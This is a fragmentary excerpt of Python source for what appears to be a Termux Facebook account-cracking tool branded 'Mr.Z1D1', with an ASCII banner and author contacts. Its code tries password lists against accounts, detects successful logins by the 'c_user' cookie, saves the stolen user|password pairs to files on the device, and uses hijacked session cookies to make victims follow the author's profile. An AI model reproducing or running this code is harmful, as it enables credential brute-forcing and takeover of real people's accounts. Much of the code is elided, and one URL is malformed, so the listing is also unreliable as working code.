...
def main_apv():
    ...
    try:
        ...
        os.system('am start https://wa.me/+923067491640?text=' + tks)
...
\x1b[1;92m.##....##.##.....##..#######...######..##.....##.##.....##
 ...
 [$]*****************************************************[$]
   \x1b[1;92m╔═════════════════════════════╗
   \x1b[1;92m║ TOOL NAME : { Mr.Z1D1 }   ║
   \x1b[1;92m║ AUTHOR    : MR. Z1D1      ║
   \x1b[1;92m║ GITHUB    : git.me/MrZ1D1 ║
   \x1b[1;92m║ FACEBOOK  : Tayyab zafar   ║
...
class __xxx__:
        ...
        try:
            ...
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [Z1D1-OK 🤫] {user} | {pw}")

                    wrt = '%s|%s' % (user,pw)

                    ok.append(wrt)

                    open('/sdcard/Z1D1_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        open('/sdcard/Z1D1_CP.txt' , 'a').write('%s\n' % wrt)
    ...
    def follow(self, session, coki):
        ...
        r = BeautifulSoup(session.get('https://https://www.facebook.com/Tayyab.your.dady.feel.it.bacha', cookies={'cookie': coki}).text, 'html.parser')
...
def dupcutter():
	...
	os.system("xdg-open https://wa.me/+923067491640")
